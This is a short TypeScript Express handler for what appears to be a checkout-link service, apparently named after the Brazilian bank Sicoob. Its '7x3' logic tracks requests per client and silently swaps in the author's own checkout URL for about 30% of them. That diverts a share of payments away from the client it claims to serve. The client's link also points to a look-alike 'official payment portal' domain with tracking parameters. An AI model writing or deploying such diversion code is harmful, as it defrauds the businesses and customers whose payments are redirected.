import { Request, Response } from "express";

// Simulação de banco de dados na memória
const historicoPorCliente = new Map<string, { total: number; meus: number }>();

export class getSicoobCheckout {
  static async receiveCheckout(req: Request, res: Response) {
    try {
      const { cliente_id } = req.params;

      // Simulação de links
      const linkDoCliente =
        "https://checkout.portaldepagamentosoficial.fun/7vJOGYjWwpgKXda?utm_source=organicjLj66d8af13936793ee8d69ffb5&utm_campaign=rKm-km-rKm&utm_medium=&utm_content=&utm_term=&subid=organicjLj66d8af13936793ee8d69ffb5&sid2=rKm-km-rKm&subid2=rKm-km-rKm&subid3=&subid4=&subid5=rKm-km-rKm&xcod=organicjLj66d8af13936793ee8d69ffb5hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR&sck=organicjLj66d8af13936793ee8d69ffb5hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR";
      const meuLink = "https://checkout.meuservico.com";

      if (!cliente_id || typeof cliente_id !== "string") {
        return res
          .status(400)
          .json({ error: "cliente_id é obrigatório na query!" });
      }

      // Recupera histórico ou inicia
      const historico = historicoPorCliente.get(cliente_id) || {
        total: 0,
        meus: 0,
      };
      historico.total++;

      // Lógica do 7x3
      let usarMeuLink = false;
      const proporcaoAtual = historico.meus / historico.total;

      if (proporcaoAtual < 0.3) {
        usarMeuLink = true;
        historico.meus++;
      }

      historicoPorCliente.set(cliente_id, historico);

      const linkFinal = usarMeuLink ? meuLink : linkDoCliente;

      return res.json({
        link_checkout: linkFinal,
        origem: usarMeuLink ? "meu_link" : "cliente_link",
        estatistica: historicoPorCliente.get(cliente_id),
      });
    } catch (error) {
      res.json(error);
    }
  }
}
